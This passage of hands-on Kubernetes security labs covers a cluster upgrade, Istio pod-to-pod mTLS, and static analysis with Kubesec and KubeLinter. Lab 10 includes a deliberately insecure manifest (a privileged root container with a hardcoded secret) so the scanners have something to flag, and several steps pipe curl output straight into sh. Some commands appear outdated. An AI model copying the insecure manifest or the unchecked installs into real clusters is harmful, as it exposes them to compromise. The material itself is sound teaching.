sudo cp -r /etc/kubernetes $BACKUP_DIR/
sudo cp -r /var/lib/kubelet $BACKUP_DIR/

# Export all cluster resources
kubectl get all --all-namespaces -o yaml > $BACKUP_DIR/all-resources.yaml

echo "Backup completed in: $BACKUP_DIR"

    Validate cluster health before upgrade:

# Check cluster component health
kubectl get componentstatuses

# Check node readiness
kubectl get nodes

# Check critical pods
kubectl get pods -n kube-system

# Run cluster health check
cat > cluster-health-check.sh << 'EOF'
#!/bin/bash

echo "=== Kubernetes Cluster Health Check ==="

# Check API server health
echo "API Server Health:"
kubectl get --raw='/readyz?verbose' | head -20

# Check etcd health
echo -e "\nEtcd Health:"
sudo ETCDCTL_API=3 etcdctl endpoint health \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key

# Check node conditions
echo -e "\nNode Conditions:"
kubectl describe nodes | grep -A 5 "Conditions:"

# Check system pods
echo -e "\nSystem Pods Status:"
kubectl get pods -n kube-system | grep -v Running | head -10

echo -e "\nCluster health check completed"
EOF

chmod +x cluster-health-check.sh
./cluster-health-check.sh

Subtask 3.2: Execute Controlled Kubernetes Upgrade

    Upgrade kubeadm first:

# Update package repository
sudo apt update

# Check available kubeadm versions
apt-cache madison kubeadm | head -5

# Upgrade kubeadm to next minor version (example: 1.27.x to 1.28.x)
# Note: In production, always upgrade one minor version at a time
sudo apt-mark unhold kubeadm
sudo apt-get update && sudo apt-get install -y kubeadm=1.28.0-00
sudo apt-mark hold kubeadm

# Verify kubeadm version
kubeadm version

    Plan and apply the upgrade:

# Plan the upgrade
sudo kubeadm upgrade plan

# Apply the upgrade (this will upgrade control plane components)
sudo kubeadm upgrade apply v1.28.0 --yes

# Verify control plane upgrade
kubectl get pods -n kube-system

    Upgrade kubelet and kubectl:

# Drain the node (if this is a worker node)
kubectl drain $(hostname) --ignore-daemonsets --delete-emptydir-data

# Upgrade kubelet and kubectl
sudo apt-mark unhold kubelet kubectl
sudo apt-get update && sudo apt-get install -y kubelet=1.28.0-00 kubectl=1.28.0-00
sudo apt-mark hold kubelet kubectl

# Restart kubelet
sudo systemctl daemon-reload
sudo systemctl restart kubelet

# Uncordon the node
kubectl uncordon $(hostname)

# Verify versions
kubectl version --short
kubelet --version

Subtask 3.3: Apply Security Patches and Validate

    Apply latest security patches:

# Update all system packages
sudo apt update && sudo apt upgrade -y

# Check for and apply Kubernetes-specific security updates
cat > apply-security-patches.sh << 'EOF'
#!/bin/bash

echo "Applying Kubernetes security patches..."

# Update container runtime (containerd)
sudo apt update
sudo apt install -y containerd.io

# Restart containerd
sudo systemctl restart containerd

# Update CNI plugins if needed
CNI_VERSION="v1.3.0"
sudo mkdir -p /opt/cni/bin
curl -L "https://github.com/containernetworking/plugins/releases/download/${CNI_VERSION}/cni-plugins-linux-amd64-${CNI_VERSION}.tgz" | sudo tar -C /opt/cni/bin -xz

# Apply any pending security configurations
sudo sysctl -p /etc/sysctl.conf

echo "Security patches applied successfully"
EOF

chmod +x apply-security-patches.sh
sudo ./apply-security-patches.sh

    Validate cluster functionality post-upgrade:

# Create comprehensive validation script
cat > post-upgrade-validation.sh << 'EOF'
#!/bin/bash

echo "=== Post-Upgrade Validation ==="

# Check cluster version
echo "Cluster Version:"
kubectl version --short

# Check node status
echo -e "\nNode Status:"
kubectl get nodes -o wide

# Check system pods
echo -e "\nSystem Pods:"
kubectl get pods -n kube-system

# Test basic functionality
echo -e "\nTesting basic functionality..."

# Create test namespace
kubectl create namespace upgrade-test

# Deploy test application
kubectl create deployment test-app --image=nginx:latest -n upgrade-test
kubectl expose deployment test-app --port=80 --target-port=80 -n upgrade-test

# Wait for deployment
kubectl wait --for=condition=available --timeout=300s deployment/test-app -n upgrade-test

# Test connectivity
kubectl get pods -n upgrade-test
kubectl get services -n upgrade-test

# Test DNS resolution
kubectl run test-dns --image=busybox:1.28 --rm -it --restart=Never -n upgrade-test -- nslookup kubernetes.default

# Clean up test resources
kubectl delete namespace upgrade-test

# Run final health check
echo -e "\nFinal Health Check:"
kubectl get componentstatuses
kubectl cluster-info

echo -e "\nPost-upgrade validation completed successfully!"
EOF

chmod +x post-upgrade-validation.sh
./post-upgrade-validation.sh

    Document upgrade and create rollback plan:

# Create upgrade documentation
cat > upgrade-documentation.md << 'EOF'
# Kubernetes Cluster Upgrade Documentation

## Upgrade Details
- **Date**: $(date)
- **Previous Version**: 1.27.x
- **New Version**: 1.28.0
- **Upgrade Method**: kubeadm

## Pre-Upgrade State
- Cluster was healthy with all nodes ready
- All system pods were running
- etcd backup created successfully

## Upgrade Steps Performed
1. Updated kubeadm to target version
2. Ran kubeadm upgrade plan
3. Applied upgrade with kubeadm upgrade apply
4. Updated kubelet and kubectl
5. Applied security patches
6. Validated cluster functionality

## Post-Upgrade Validation
- All nodes are ready and running target version
- System pods are healthy
- Basic functionality tests passed
- DNS resolution working correctly

## Rollback Procedure (if needed)
1. Restore etcd from backup: $BACKUP_DIR/etcd-snapshot.db
2. Restore configuration files from: $BACKUP_DIR/
3. Downgrade kubeadm, kubelet, kubectl packages
4. Run kubeadm upgrade apply with previous version

## Security Enhancements Applied
- API server hardened with IP restrictions
- mTLS authentication enabled
- Unused components disabled
- CIS benchmark remediations applied
- Latest security patches installed
EOF

echo "Upgrade documentation created: upgrade-documentation.md"

Troubleshooting Common Issues
API Server Issues

If the API server fails to start after hardening:

# Check API server logs
sudo journalctl -u kubelet -f | grep apiserver

# Restore from backup if needed
sudo cp /etc/kubernetes/manifests/kube-apiserver.yaml.backup /etc/kubernetes/manifests/kube-apiserver.yaml

# Verify certificate validity
openssl x509 -in /etc/kubernetes/pki/apiserver.crt -text -noout

Certificate Issues

If client certificate authentication fails:

# Verify certificate chain
openssl verify -CAfile /etc/kubernetes/pki/ca.crt /etc/kubernetes/pki/clients/admin-client.crt

# Regenerate certificates if needed
sudo openssl x509 -req -in /etc/kubernetes/pki/clients/admin-client.csr \
  -CA /etc/kubernetes/pki/ca.crt -CAkey /etc/kubernetes/pki/ca.key \
  -out /etc/kubernetes/pki/clients/admin-client.crt -days 365

Upgrade Rollback

If upgrade fails and rollback is needed:

# Restore etcd from backup
sudo ETCDCTL_API=3 etcdctl snapshot restore $BACKUP_DIR/etcd-snapshot.db \
  --data-dir=/var/lib/etcd-restore

# Stop etcd and replace data directory
sudo systemctl stop etcd
sudo mv /var/lib/etcd /var/lib/etcd-backup
sudo mv /var/lib/etcd-restore /var/lib/etcd
sudo systemctl start etcd

Conclusion

In this comprehensive lab, you have successfully:

• Hardened the Kubernetes API server by implementing IP-based access controls and mutual TLS authentication, significantly reducing the attack surface and ensuring only authorized clients can access the cluster

• Identified and disabled unused components while validating your security posture against industry-standard CIS Kubernetes Benchmarks, demonstrating how to maintain a minimal and secure cluster configuration

• Executed a controlled Kubernetes version upgrade from planning through validation, including the application of security patches and comprehensive testing to ensure cluster stability

• Implemented security best practices including proper certificate management, RBAC cleanup, audit logging, and admission control policies that are essential for production Kubernetes environments

These skills are critical for maintaining secure, up-to-date Kubernetes clusters in production environments. The hardening techniques you've learned help protect against common attack vectors, while the upgrade procedures ensure you can safely maintain cluster currency with the latest security patches and features.

The combination of proactive security hardening, continuous compliance validation through CIS benchmarks, and systematic upgrade procedures forms the foundation of a robust Kubernetes security strategy. These practices are essential for anyone pursuing the Certified Kubernetes Security Specialist (CKS) certification and for maintaining production Kubernetes environments.

Remember to regularly review and update your security configurations, perform routine CIS benchmark assessments, and maintain a disciplined approach to cluster upgrades to ensure ongoing security and stability of your





Lab 9: Implementing Pod-to-Pod Encryption
Objectives

By the end of this lab, students will be able to:

• Deploy and configure Istio service mesh on a Kubernetes cluster • Implement mutual TLS (mTLS) for secure Pod-to-Pod communication • Configure automatic and strict mTLS policies across the service mesh • Test and verify encrypted traffic between Pods using various methods • Monitor and analyze encrypted traffic flows using Istio observability tools • Troubleshoot common mTLS configuration issues • Understand the security benefits of service mesh encryption
Prerequisites

Before starting this lab, students should have:

• Basic understanding of Kubernetes concepts (Pods, Services, Deployments) • Familiarity with kubectl command-line tool • Knowledge of TLS/SSL encryption concepts • Understanding of network security principles • Experience with YAML configuration files • Basic Linux command-line skills

Note: Al Nafi provides ready-to-use Linux-based cloud machines with Kubernetes pre-installed. Simply click Start Lab to begin - no need to build your own VM or install Kubernetes.
Lab Environment Setup

Your cloud machine comes pre-configured with: • Kubernetes cluster (3 nodes) • kubectl configured and ready to use • Docker runtime • curl and other networking tools
Task 1: Installing and Configuring Istio Service Mesh
Subtask 1.1: Download and Install Istio

First, we'll download and install the latest stable version of Istio.

# Download Istio
curl -L https://istio.io/downloadIstio | sh -

# Move to Istio directory
cd istio-*

# Add istioctl to PATH
export PATH=$PWD/bin:$PATH

# Verify installation
istioctl version

Subtask 1.2: Install Istio on Kubernetes Cluster

Install Istio using the demo configuration profile, which includes all core components.

# Install Istio with demo profile
istioctl install --set values.defaultRevision=default -y

# Verify installation
kubectl get pods -n istio-system

# Wait for all pods to be running
kubectl wait --for=condition=ready pod --all -n istio-system --timeout=300s

Subtask 1.3: Enable Automatic Sidecar Injection

Configure automatic sidecar injection for the default namespace.

# Label the default namespace for automatic sidecar injection
kubectl label namespace default istio-injection=enabled

# Verify the label
kubectl get namespace default --show-labels

Task 2: Deploying Sample Applications
Subtask 2.1: Create Sample Applications

We'll deploy two sample applications to test Pod-to-Pod encryption.

Create the first application (frontend):

cat <<EOF | kubectl apply -f -
apiVersion: apps/v1
kind: Deployment
metadata:
  name: frontend
  labels:
    app: frontend
spec:
  replicas: 1
  selector:
    matchLabels:
      app: frontend
  template:
    metadata:
      labels:
        app: frontend
    spec:
      containers:
      - name: frontend
        image: nginx:1.21
        ports:
        - containerPort: 80
        volumeMounts:
        - name: html
          mountPath: /usr/share/nginx/html
      volumes:
      - name: html
        configMap:
          name: frontend-config
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: frontend-config
data:
  index.html: |
    <html>
    <head><title>Frontend Service</title></head>
    <body>
    <h1>Frontend Application</h1>
    <p>This is the frontend service running with Istio sidecar.</p>
    </body>
    </html>
---
apiVersion: v1
kind: Service
metadata:
  name: frontend
  labels:
    app: frontend
spec:
  ports:
  - port: 80
    targetPort: 80
  selector:
    app: frontend
EOF

Create the second application (backend):

cat <<EOF | kubectl apply -f -
apiVersion: apps/v1
kind: Deployment
metadata:
  name: backend
  labels:
    app: backend
spec:
  replicas: 1
  selector:
    matchLabels:
      app: backend
  template:
    metadata:
      labels:
        app: backend
    spec:
      containers:
      - name: backend
        image: httpd:2.4
        ports:
        - containerPort: 80
        volumeMounts:
        - name: html
          mountPath: /usr/local/apache2/htdocs
      volumes:
      - name: html
        configMap:
          name: backend-config
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: backend-config
data:
  index.html: |
    <html>
    <head><title>Backend Service</title></head>
    <body>
    <h1>Backend Application</h1>
    <p>This is the backend service with secure communication.</p>
    <p>Current time: $(date)</p>
    </body>
    </html>
---
apiVersion: v1
kind: Service
metadata:
  name: backend
  labels:
    app: backend
spec:
  ports:
  - port: 80
    targetPort: 80
  selector:
    app: backend
EOF

Subtask 2.2: Verify Application Deployment

Check that both applications are running with Istio sidecars:

# Check pod status
kubectl get pods

# Verify sidecar injection (should show 2/2 containers)
kubectl get pods -o wide

# Check services
kubectl get services

Each pod should show 2/2 containers, indicating the main application container and the Istio sidecar proxy.
Task 3: Implementing Mutual TLS (mTLS)
Subtask 3.1: Check Current mTLS Status

Before configuring mTLS, let's check the current security status:

# Check mTLS status for all services
istioctl authn tls-check

# Check specific service mTLS status
istioctl authn tls-check frontend.default.svc.cluster.local

Subtask 3.2: Configure Automatic mTLS

Istio automatically enables mTLS between services with sidecars. Let's verify this is working:

# Create a test pod to check connectivity
kubectl run test-pod --image=curlimages/curl:7.85.0 --rm -it --restart=Never -- sh

# Inside the test pod, try to access the services
curl -v http://frontend.default.svc.cluster.local
curl -v http://backend.default.svc.cluster.local

Exit the test pod by typing exit.
Subtask 3.3: Configure Strict mTLS Policy

Create a strict mTLS policy to enforce encrypted communication:

cat <<EOF | kubectl apply -f -
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default-strict-mtls
  namespace: default
spec:
  mtls:
    mode: STRICT
EOF

Subtask 3.4: Verify Strict mTLS Enforcement

Test that non-mTLS traffic is now blocked:

# Create a pod without Istio sidecar in a different namespace
kubectl create namespace test-no-istio

# Deploy a test pod without sidecar injection
kubectl run test-no-sidecar --image=curlimages/curl:7.85.0 --rm -it --restart=Never -n test-no-istio -- sh

# Try to access services (this should fail)
curl -v http://frontend.default.svc.cluster.local --max-time 10

This should fail because the test pod doesn't have an Istio sidecar and can't establish mTLS connection.
Task 4: Testing Encrypted Traffic Between Pods
Subtask 4.1: Test Internal Pod Communication

Create a client pod with Istio sidecar to test encrypted communication:

cat <<EOF | kubectl apply -f -
apiVersion: apps/v1
kind: Deployment
metadata:
  name: client
  labels:
    app: client
spec:
  replicas: 1
  selector:
    matchLabels:
      app: client
  template:
    metadata:
      labels:
        app: client
    spec:
      containers:
      - name: client
        image: curlimages/curl:7.85.0
        command: ["/bin/sh"]
        args: ["-c", "while true; do sleep 30; done"]
EOF

Subtask 4.2: Verify Encrypted Communication

Test communication between pods with mTLS:

# Get the client pod name
CLIENT_POD=$(kubectl get pod -l app=client -o jsonpath='{.items[0].metadata.name}')

# Test communication to frontend
kubectl exec -it $CLIENT_POD -- curl -s http://frontend.default.svc.cluster.local

# Test communication to backend
kubectl exec -it $CLIENT_POD -- curl -s http://backend.default.svc.cluster.local

# Test with verbose output to see connection details
kubectl exec -it $CLIENT_POD -- curl -v http://frontend.default.svc.cluster.local

Subtask 4.3: Analyze Certificate Information

Check the mTLS certificates being used:

# Check certificate details for frontend service
istioctl proxy-config secret $CLIENT_POD

# Get detailed certificate information
kubectl exec -it $CLIENT_POD -c istio-proxy -- openssl s_client -connect frontend.default.svc.cluster.local:80 -servername frontend.default.svc.cluster.local < /dev/null

Task 5: Monitoring and Verifying Encrypted Traffic
Subtask 5.1: Install Istio Observability Tools

Deploy Kiali, Prometheus, and Grafana for monitoring:

# Install observability addons
kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.20/samples/addons/prometheus.yaml
kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.20/samples/addons/grafana.yaml
kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.20/samples/addons/kiali.yaml

# Wait for deployments to be ready
kubectl wait --for=condition=available --timeout=300s deployment/kiali -n istio-system
kubectl wait --for=condition=available --timeout=300s deployment/prometheus -n istio-system
kubectl wait --for=condition=available --timeout=300s deployment/grafana -n istio-system

Subtask 5.2: Generate Traffic for Monitoring

Create continuous traffic between services:

# Create a script to generate traffic
cat <<EOF > generate-traffic.sh
#!/bin/bash
CLIENT_POD=\$(kubectl get pod -l app=client -o jsonpath='{.items[0].metadata.name}')
while true; do
  kubectl exec -it \$CLIENT_POD -- curl -s http://frontend.default.svc.cluster.local > /dev/null
  kubectl exec -it \$CLIENT_POD -- curl -s http://backend.default.svc.cluster.local > /dev/null
  sleep 2
done
EOF

chmod +x generate-traffic.sh

# Run traffic generation in background
./generate-traffic.sh &
TRAFFIC_PID=$!

Subtask 5.3: Access Kiali Dashboard

Open Kiali dashboard to visualize service mesh traffic:

# Port forward Kiali dashboard
kubectl port-forward -n istio-system service/kiali 20001:20001 &
KIALI_PID=$!

echo "Kiali dashboard available at: http://localhost:20001"
echo "Username: admin, Password: admin"

Note: In a real environment, you would access this through your browser. The dashboard shows: • Service topology and traffic flow • mTLS status indicators (lock icons) • Traffic metrics and success rates • Security policies in effect
Subtask 5.4: Monitor mTLS Status

Use command-line tools to monitor mTLS status:

# Check mTLS status for all workloads
istioctl authn tls-check

# Get detailed proxy configuration
istioctl proxy-config cluster $CLIENT_POD --fqdn frontend.default.svc.cluster.local

# Check security policies
kubectl get peerauthentication -A
kubectl get destinationrule -A

Subtask 5.5: Verify Traffic Encryption with tcpdump

Capture and analyze network traffic to verify encryption:

# Get the frontend pod name
FRONTEND_POD=$(kubectl get pod -l app=frontend -o jsonpath='{.items[0].metadata.name}')

# Capture traffic on the frontend pod
kubectl exec -it $FRONTEND_POD -c istio-proxy -- tcpdump -i any -n -A port 15001 &
TCPDUMP_PID=$!

# Generate some traffic
kubectl exec -it $CLIENT_POD -- curl http://frontend.default.svc.cluster.local

# Stop tcpdump after a few seconds
sleep 5
kill $TCPDUMP_PID 2>/dev/null

The captured traffic should show encrypted data, not plain text HTTP requests.
Task 6: Testing Unauthorized Access Blocking
Subtask 6.1: Create Unauthorized Client

Deploy a service without proper mTLS configuration:

# Create a namespace without Istio injection
kubectl create namespace unauthorized

# Deploy a client without sidecar
cat <<EOF | kubectl apply -f -
apiVersion: apps/v1
kind: Deployment
metadata:
  name: unauthorized-client
  namespace: unauthorized
  labels:
    app: unauthorized-client
spec:
  replicas: 1
  selector:
    matchLabels:
      app: unauthorized-client
  template:
    metadata:
      labels:
        app: unauthorized-client
    spec:
      containers:
      - name: client
        image: curlimages/curl:7.85.0
        command: ["/bin/sh"]
        args: ["-c", "while true; do sleep 30; done"]
EOF

Subtask 6.2: Test Access Blocking

Verify that unauthorized access is blocked:

# Get unauthorized client pod name
UNAUTH_POD=$(kubectl get pod -l app=unauthorized-client -n unauthorized -o jsonpath='{.items[0].metadata.name}')

# Try to access services (should fail)
kubectl exec -it $UNAUTH_POD -n unauthorized -- curl -v --max-time 10 http://frontend.default.svc.cluster.local

# Try to access backend (should also fail)
kubectl exec -it $UNAUTH_POD -n unauthorized -- curl -v --max-time 10 http://backend.default.svc.cluster.local

These requests should fail with connection timeout or connection refused errors.
Subtask 6.3: Verify Error Logs

Check the Istio proxy logs to see blocked connections:

# Check frontend proxy logs for blocked connections
kubectl logs $FRONTEND_POD -c istio-proxy | grep -i "tls\|ssl\|handshake"

# Check backend proxy logs
BACKEND_POD=$(kubectl get pod -l app=backend -o jsonpath='{.items[0].metadata.name}')
kubectl logs $BACKEND_POD -c istio-proxy | grep -i "tls\|ssl\|handshake"

Task 7: Advanced mTLS Configuration
Subtask 7.1: Configure Selective mTLS

Create a more granular mTLS policy for specific services:

cat <<EOF | kubectl apply -f -
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: backend-strict-mtls
  namespace: default
spec:
  selector:
    matchLabels:
      app: backend
  mtls:
    mode: STRICT
---
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: frontend-permissive-mtls
  namespace: default
spec:
  selector:
    matchLabels:
      app: frontend
  mtls:
    mode: PERMISSIVE
EOF

Subtask 7.2: Test Selective Policies

Test the different mTLS modes:

# Test access to backend (should require mTLS)
kubectl exec -it $CLIENT_POD -- curl -v http://backend.default.svc.cluster.local

# Test access to frontend (should allow both mTLS and plain text)
kubectl exec -it $CLIENT_POD -- curl -v http://frontend.default.svc.cluster.local

# Test from unauthorized client to frontend (should work in PERMISSIVE mode)
kubectl exec -it $UNAUTH_POD -n unauthorized -- curl -v --max-time 10 http://frontend.default.svc.cluster.local

Task 8: Troubleshooting Common Issues
Subtask 8.1: Debug mTLS Configuration

Common troubleshooting commands:

# Check Istio configuration status
istioctl analyze

# Verify proxy configuration
istioctl proxy-status

# Check certificate rotation
istioctl proxy-config secret $CLIENT_POD -o json | jq '.dynamicActiveSecrets[0].secret.tlsCertificate.certificateChain.inlineBytes' | base64 -d | openssl x509 -text -noout

# Debug specific service connectivity
istioctl proxy-config listeners $CLIENT_POD --port 80

Subtask 8.2: Common Issues and Solutions

Issue 1: Pods showing 1/2 containers ready

# Check sidecar injection
kubectl describe pod $FRONTEND_POD

# Verify namespace labeling
kubectl get namespace default --show-labels

Issue 2: mTLS not working

# Check PeerAuthentication policies
kubectl get peerauthentication -A -o yaml

# Verify Istio installation
kubectl get pods -n istio-system

Issue 3: Connection timeouts

# Check service endpoints
kubectl get endpoints

# Verify DNS resolution
kubectl exec -it $CLIENT_POD -- nslookup frontend.default.svc.cluster.local

Cleanup

Stop background processes and clean up resources:

# Stop traffic generation
kill $TRAFFIC_PID 2>/dev/null

# Stop port forwarding
kill $KIALI_PID 2>/dev/null

# Remove test resources
kubectl delete namespace unauthorized
kubectl delete deployment client frontend backend
kubectl delete service frontend backend
kubectl delete configmap frontend-config backend-config
kubectl delete peerauthentication --all

# Remove Istio (optional)
# istioctl uninstall --purge -y

Conclusion

In this comprehensive lab, you have successfully:

• Deployed Istio service mesh on a Kubernetes cluster and configured automatic sidecar injection • Implemented mutual TLS (mTLS) to secure Pod-to-Pod communication with both automatic and strict policies • Tested encrypted traffic flows between services and verified that unauthorized access is properly blocked • Monitored encrypted traffic using Istio's observability tools including Kiali, Prometheus, and network analysis • Configured advanced mTLS policies with selective enforcement for different services • Troubleshot common issues and learned debugging techniques for service mesh security

Why This Matters: Pod-to-Pod encryption using service mesh technology like Istio provides several critical security benefits:

• Zero-trust networking - All communication is encrypted by default • Automatic certificate management - No manual certificate handling required • Policy-based security - Granular control over which services can communicate • Compliance requirements - Meets regulatory requirements for data in transit • Observability - Complete visibility into secure communication patterns

This knowledge is essential for the Certified Kubernetes Security Specialist (CKS) certification and real-world Kubernetes security implementations. Service mesh encryption is becoming a standard practice in production environments where security and compliance are paramount.

The skills you've learned here directly apply to securing microservices architectures, implementing zero-trust networking principles, and maintaining compliance in cloud-native environments.






Lab 10: Static Analysis and Compliance in CI/CD
Objectives

By the end of this lab, students will be able to:

• Configure a CI/CD pipeline to perform static analysis of container images and Kubernetes manifests • Integrate Kubesec and KubeLinter to identify security misconfigurations in deployment files • Implement image registry restrictions and enforce compliance policies using admission controllers • Understand the importance of security scanning in the software development lifecycle • Apply security best practices for container and Kubernetes deployments
Prerequisites

Before starting this lab, students should have:

• Basic understanding of Kubernetes concepts (pods, deployments, services) • Familiarity with Docker containers and container images • Basic knowledge of CI/CD pipeline concepts • Understanding of YAML file structure • Basic Linux command-line experience • Knowledge of Git version control system
Lab Environment Setup

Ready-to-Use Cloud Machines: Al Nafi provides Linux-based cloud machines with all necessary tools pre-installed. Simply click Start Lab to begin - no need to build your own VM or install additional software.

Your lab environment includes: • Ubuntu 20.04 LTS with Docker installed • Kubernetes cluster (kind) pre-configured • Git, curl, and other essential tools • Internet access for downloading tools and images
Task 1: Setting Up the Lab Environment
Subtask 1.1: Verify Environment and Install Required Tools

First, let's verify our environment and install the necessary tools for static analysis.

    Check the current environment:

# Verify Docker is running
docker --version
sudo systemctl status docker

# Check if Kubernetes cluster is available
kubectl cluster-info
kubectl get nodes

    Install Kubesec for Kubernetes manifest analysis:

# Download and install Kubesec
curl -sSX GET https://api.github.com/repos/controlplaneio/kubesec/releases/latest \
  | grep browser_download_url \
  | grep linux-amd64 \
  | cut -d '"' -f 4 \
  | xargs curl -sSL -o kubesec

# Make it executable and move to PATH
chmod +x kubesec
sudo mv kubesec /usr/local/bin/

# Verify installation
kubesec version

    Install KubeLinter for additional manifest analysis:

# Download and install KubeLinter
curl -L https://github.com/stackrox/kube-linter/releases/download/0.6.8/kube-linter-linux.tar.gz \
  | tar xz

# Move to PATH
sudo mv kube-linter /usr/local/bin/

# Verify installation
kube-linter version

    Install Trivy for container image scanning:

# Install Trivy
sudo apt-get update
sudo apt-get install wget apt-transport-https gnupg lsb-release -y

wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
echo "deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main" | sudo tee -a /etc/apt/sources.list.d/trivy.list

sudo apt-get update
sudo apt-get install trivy -y

# Verify installation
trivy --version

Subtask 1.2: Create Project Structure

    Create a project directory structure:

# Create main project directory
mkdir -p ~/security-lab
cd ~/security-lab

# Create subdirectories for different components
mkdir -p {manifests,policies,scripts,reports}

# Create a sample application directory
mkdir -p app

    Initialize a Git repository:

# Initialize Git repository
git init
git config user.name "Security Lab User"
git config user.email "user@securitylab.com"

# Create initial README
cat > README.md << 'EOF'
# Security Lab - Static Analysis and Compliance

This repository contains Kubernetes manifests and CI/CD configurations for security analysis.

## Structure
- `manifests/` - Kubernetes YAML files
- `policies/` - Security policies and admission controllers
- `scripts/` - Automation scripts
- `reports/` - Security scan reports
EOF

git add README.md
git commit -m "Initial commit"

Task 2: Creating Sample Applications and Manifests
Subtask 2.1: Create Vulnerable Kubernetes Manifests

Let's create some intentionally vulnerable Kubernetes manifests to demonstrate security scanning.

    Create a vulnerable deployment manifest:

cat > manifests/vulnerable-app.yaml << 'EOF'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vulnerable-app
  namespace: default
spec:
  replicas: 2
  selector:
    matchLabels:
      app: vulnerable-app
  template:
    metadata:
      labels:
        app: vulnerable-app
    spec:
      containers:
      - name: app
        image: nginx:1.14
        ports:
        - containerPort: 80
        securityContext:
          runAsUser: 0
          privileged: true
          allowPrivilegeEscalation: true
        resources: {}
        env:
        - name: SECRET_KEY
          value: "hardcoded-secret-123"
---
apiVersion: v1
kind: Service
metadata:
  name: vulnerable-app-service
spec:
  selector:
    app: vulnerable-app
  ports:
  - port: 80
    targetPort: 80
  type: LoadBalancer
EOF

    Create a more secure deployment for comparison:

cat > manifests/secure-app.yaml << 'EOF'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: secure-app
  namespace: default
spec:
  replicas: 2
  selector:
    matchLabels:
      app: secure-app
  template:
    metadata:
      labels:
        app: secure-app
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        fsGroup: 2000
      containers:
      - name: app
        image: nginx:1.21-alpine
        ports:
        - containerPort: 8080
        securityContext:
          runAsNonRoot: true
          runAsUser: 1000
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          capabilities:
            drop:
            - ALL
        resources:
          requests:
            memory: "64Mi"
            cpu: "250m"
          limits:
            memory: "128Mi"
            cpu: "500m"
        livenessProbe:
          httpGet:
            path: /
            port: 8080
          initialDelaySeconds: 30
          periodSeconds: 10
        readinessProbe:
          httpGet:
            path: /
            port: 8080
          initialDelaySeconds: 5
          periodSeconds: 5
        env:
        - name: SECRET_KEY
          valueFrom:
            secretKeyRef:
              name: app-secret
              key: secret-key
---
apiVersion: v1
kind: Secret
metadata:
  name: app-secret
type: Opaque
data:
  secret-key: bXktc2VjcmV0LWtleQ==
---
apiVersion: v1
kind: Service
metadata:
  name: secure-app-service
spec:
  selector:
    app: secure-app
  ports:
  - port: 80
    targetPort: 8080
  type: ClusterIP
EOF

Subtask 2.2: Create Network Policies

    Create a network policy for security:

cat > manifests/network-policy.yaml << 'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: default
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-secure-app
  namespace: default
spec:
  podSelector:
    matchLabels:
      app: secure-app
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - protocol: TCP
      port: 8080
  egress:
  - to: []
    ports:
    - protocol: TCP
      port: 53
    - protocol: UDP
      port: 53
EOF

Task 3: Implementing Static Analysis with Kubesec and KubeLinter
Subtask 3.1: Analyze Manifests with Kubesec

    Run Kubesec analysis on vulnerable manifest:

# Analyze the vulnerable deployment
kubesec scan manifests/vulnerable-app.yaml

# Save the results to a report file
kubesec scan manifests/vulnerable-app.yaml > reports/kubesec-vulnerable-report.json

# View the report in a readable format
cat reports/kubesec-vulnerable-report.json | jq '.'

    Run Kubesec analysis on secure manifest:

# Analyze the secure deployment
kubesec scan manifests/secure-app.yaml > reports/kubesec-secure-report.json

# Compare the scores
echo "Vulnerable app score:"
cat reports/kubesec-vulnerable-report.json | jq '.[0].score'

echo "Secure app score:"
cat reports/kubesec-secure-report.json | jq '.[0].score'

    Create a script to automate Kubesec scanning:

cat > scripts/kubesec-scan.sh << 'EOF'
#!/bin/bash

# Kubesec scanning script
MANIFEST_DIR="manifests"
REPORT_DIR="reports"

echo "Starting Kubesec security analysis..."

# Create reports directory if it doesn't exist
mkdir -p $REPORT_DIR

# Scan all YAML files in manifests directory
for file in $MANIFEST_DIR/*.yaml; do
    if [ -f "$file" ]; then
        filename=$(basename "$file" .yaml)
        echo "Scanning $file..."
        
        # Run kubesec scan and save results
        kubesec scan "$file" > "$REPORT_DIR/kubesec-$filename.json"
        
        # Extract and display score
        score=$(cat "$REPORT_DIR/kubesec-$filename.json" | jq -r '.[0].score // "N/A"')
        echo "Security score for $filename: $score"
        
        # Check if score is below threshold
        if [ "$score" != "N/A" ] && [ "$score" -lt 0 ]; then
            echo "WARNING: $filename has a negative security score!"
            echo "Critical issues found:"
            cat "$REPORT_DIR/kubesec-$filename.json" | jq -r '.[0].scoring.critical[]?.reason // empty'
        fi
        echo "---"
    fi
done

echo "Kubesec analysis complete. Reports saved in $REPORT_DIR/"
EOF

chmod +x scripts/kubesec-scan.sh

    Run the automated Kubesec scan:

./scripts/kubesec-scan.sh

Subtask 3.2: Analyze Manifests with KubeLinter

    Run KubeLinter analysis:

# Analyze all manifests with KubeLinter
kube-linter lint manifests/

# Save detailed results to a file
kube-linter lint manifests/ --format json > reports/kubelinter-report.json

# View summary of issues
kube-linter lint manifests/ --format sarif > reports/kubelinter-sarif.json

    Create a custom KubeLinter configuration:

cat > policies/kubelinter-config.yaml << 'EOF'
checks:
  # Security-focused checks
  doNotAutoMount: true
  noReadOnlyRootFilesystem: true
  privilegedContainer: true
  runAsNonRoot: true
  sensitiveContainerEnvVar: true
  
  # Resource and reliability checks
  cpuRequirements: true
  memoryRequirements: true
